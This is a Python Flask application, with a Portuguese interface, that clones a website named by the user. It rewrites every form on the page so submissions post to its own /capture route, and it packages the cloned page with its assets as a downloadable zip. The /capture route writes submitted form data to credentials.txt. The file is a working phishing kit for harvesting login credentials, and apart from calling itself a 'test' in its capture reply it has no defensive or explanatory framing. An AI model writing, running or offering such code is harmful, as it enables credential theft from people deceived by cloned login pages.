import os
import zipfile
import requests
from flask import Flask, request, send_file, render_template_string
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse

app = Flask(__name__)

SAVE_DIR = "cloned_sites"
if not os.path.exists(SAVE_DIR):
    os.makedirs(SAVE_DIR)

def download_file(url, folder):
    try:
        response = requests.get(url)
        if response.status_code == 200:
            filename = os.path.join(folder, os.path.basename(urlparse(url).path))
            with open(filename, "wb") as file:
                file.write(response.content)
            return filename
        return None
    except Exception as e:
        print(f"Erro ao baixar arquivo {url}: {e}")
        return None

def download_and_modify(url):
    try:
        response = requests.get(url)
        response.raise_for_status()

        soup = BeautifulSoup(response.text, "html.parser")
        forms = soup.find_all("form")
        if not forms:
            return "O site não possui formulários de login."

        for form in forms:
            form["action"] = "/capture"
            form["method"] = "post"

            hidden_input = soup.new_tag("input", attrs={
                "type": "hidden",
                "name": "source_url",
                "value": url
            })
            form.append(hidden_input)

        for tag in soup.find_all(["link", "script", "img"]):
            src_attr = "src" if tag.name != "link" else "href"
            if tag.get(src_attr):
                resource_url = urljoin(url, tag[src_attr])
                file_path = download_file(resource_url, SAVE_DIR)
                if file_path:
                    tag[src_attr] = os.path.basename(file_path)

        file_path = os.path.join(SAVE_DIR, "index.html")
        with open(file_path, "w", encoding="utf-8") as file:
            file.write(str(soup))

        zip_filename = f"{SAVE_DIR}.zip"
        with zipfile.ZipFile(zip_filename, "w") as zipf:
            for root, _, files in os.walk(SAVE_DIR):
                for file in files:
                    zipf.write(os.path.join(root, file), os.path.relpath(os.path.join(root, file), SAVE_DIR))

        return zip_filename

    except requests.RequestException as e:
        return f"Erro ao baixar o site: {str(e)}"

@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "POST":
        url = request.form["url"]
        zip_file = download_and_modify(url)
        if "Erro" in zip_file:
            return f"<p>{zip_file}</p><a href='/'>Tentar novamente</a>"
        return render_template_string('''
        <html>
        <head>
            <style>
                body {
                    background-color: #1b8c77;
                    color: white;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    height: 100vh;
                    margin: 0;
                    font-family: Arial, sans-serif;
                }
                .button {
                    background-color: white;
                    color: #1b8c77;
                    padding: 10px 20px;
                    border-radius: 8px;
                    text-decoration: none;
                    font-weight: bold;
                    display: inline-block;
                    text-align: center;
                }
                .button:hover {
                    background-color: #f0f0f0;
                }
            </style>
        </head>
        <body>
            <a class="button" href="/download">Baixar o site clonado</a>
        </body>
        </html>
        ''')

    return render_template_string('''
        <html>
        <head>
            <style>
                body {
                    background-color: #1b8c77;
                    color: white;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    height: 100vh;
                    margin: 0;
                    font-family: Arial, sans-serif;
                }
                .container {
                    background-color: white;
                    color: #1b8c77;
                    padding: 20px;
                    border-radius: 12px;
                    box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
                    text-align: center;
                }
                input[type="text"] {
                    padding: 8px;
                    width: 250px;
                    margin: 5px;
                    border-radius: 4px;
                    border: 1px solid #ccc;
                }
                button {
                    padding: 8px 16px;
                    background-color: #1b8c77;
                    color: white;
                    border: none;
                    border-radius: 4px;
                    cursor: pointer;
                }
                button:hover {
                    background-color: #147a64;
                }
                h2 {
                    margin-bottom: 15px;
                    font-size: 18px;
                }
            </style>
        </head>
        <body>
            <div class="container">
                <h2>Ferramenta de Clonagem de Sites</h2>
                <form method="post">
                    <input type="text" name="url" placeholder="Digite a URL" required>
                    <button type="submit">Clonar</button>
                </form>
            </div>
        </body>
        </html>
    ''')

@app.route("/download")
def download():
    zip_path = f"{SAVE_DIR}.zip"
    if os.path.exists(zip_path):
        return send_file(zip_path, as_attachment=True)
    return "Arquivo não encontrado."

@app.route("/capture", methods=["POST"])
def capture():
    with open("credentials.txt", "a") as file:
        file.write(str(request.form) + "\n")
    return "Dados capturados! Teste finalizado."

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
